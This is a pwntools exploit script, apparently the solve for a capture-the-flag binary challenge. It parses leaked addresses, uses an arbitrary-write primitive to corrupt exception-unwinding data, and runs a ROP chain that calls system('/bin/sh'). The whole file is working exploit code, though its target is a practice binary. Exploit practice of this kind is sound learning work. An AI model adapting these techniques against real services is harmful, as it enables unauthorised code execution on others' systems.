from pwn import *

context.binary = e = ELF("./challenge")
libc = ELF("./libc.so.6")

# p = process(e.path)
p = remote(os.environ.get('HOST', 'localhost'), 31337)

p.recvuntil(b"main: ")
e.address = int(p.recvline().strip().decode(), 16) - e.sym['main']
p.recvuntil(b"var: ")
stack = int(p.recvline().strip().decode(), 16)
p.recvuntil(b"printf: ")
libc.address = int(p.recvline().strip().decode(), 16) - libc.sym['printf']
log.info(f"PIE base: {e.address:#x}")
log.info(f"Stack var: {stack:#x}")
log.info(f"LIBC base: {libc.address:#x}")

def write(addr: int, data: bytes, payload: bytes=b""):
    for i in range(0, len(data), 8):
        chunk = data[i:i+8].ljust(8, b'\x00')
        p.sendlineafter(b'Where to write?\n', hex(addr + i).encode())
        p.sendlineafter(b'What to write?\n', hex(u64(chunk)).encode())
        if i + 8 >= len(data):
            p.sendlineafter(b'Write again?\n', b'0X' + payload)
        else:
            p.sendlineafter(b'Write again?\n', b'1')

def leb_encode(n: int) -> bytes:
    ret = []
    while n >= 0x80:
        ret.append(0x80 | (n & 0x7f))
        n >>= 7
    ret.append(n)
    return bytes(ret)

def leb_decode(b: bytes) -> int:
    ret = 0
    shift = 0
    for v in b:
        ret |= (v & 0x7f) << shift
        if v & 0x80:
            shift += 7
        else:
            return ret

fde_base = e.address + 0x12e0
landing_pad = e.address + 0x227f
target_addr = libc.sym["gets"]
pl = b""
pl += p64(libc.address + 0x10f75b) # pop rdi; ret
pl += p64(next(libc.search(b"/bin/sh\x00")))
pl += p64(libc.sym["system"])
# gdb.attach(p)
write(landing_pad, leb_encode(target_addr - landing_pad + 0xf9f), pl)
p.sendline(b"./submitter")
print(p.recvrepeat(timeout=3))
